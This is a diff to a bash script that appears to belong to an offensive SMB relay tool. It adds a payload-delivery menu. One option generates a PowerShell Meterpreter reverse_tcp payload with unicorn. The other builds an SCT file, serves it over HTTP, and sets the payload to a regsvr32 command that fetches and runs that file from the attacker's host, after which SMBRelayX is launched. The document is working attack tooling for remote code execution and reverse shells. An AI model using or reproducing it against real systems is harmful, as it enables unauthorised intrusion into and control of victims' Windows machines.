@@ -84,6 +84,7 @@ spinner
 if [ -d unicorn/ ]; then
   echo ""
   echo "Unicorn Dir is Present, Moving on"
+  sleep 0.02
 else
   echo ""
   echo "Unicorn is not Present, Please run install_req.sh"
@@ -165,10 +166,40 @@ elif [ "$select" = "2" ]; then
   echo -ne ">"; read lport
 fi
 
-echo "Generating Payload..."
-spinner
-python unicorn/unicorn.py windows/meterpreter/reverse_tcp $lhost $lport >> relayer.log
-payload=$(cat powershell_attack.txt)
+#Select Payload delivery method
+
+echo "Select Payload Delivery Method"
+
+select method in unicorn sct
+do
+    case $method in
+      unicorn)
+         echo "Generating Payload..."
+         spinner
+         python unicorn/unicorn.py windows/meterpreter/reverse_tcp $lhost $lport >> relayer.log
+         payload=$(cat powershell_attack.txt)
+         break
+         ;;
+      sct)
+         echo "Generating sct file and launching HTTP Server on port 8080"
+         spinner
+         cd ps1encode/
+         ./ps1encode.rb --PAYLOAD windows/meterpreter/reverse_tcp --LHOST=$lhost --LPORT=$lport -t sct
+         cd ..
+         mkdir site
+         cp ps1encode/index.sct site/index.sct
+         cd site
+         python -m SimpleHTTPServer 8080 >/dev/null 2>&1 &
+         cd ..
+         payload="regsvr32 /s /n /u /i:http://$lhost:8080/index.sct scrobj.dll"
+         break
+         ;;
+      *)
+         echo "Error, Please select payload method"
+         ;;
+      esac
+done
+
 echo "Payload created"
 echo "Starting SMBRelayX..."
 
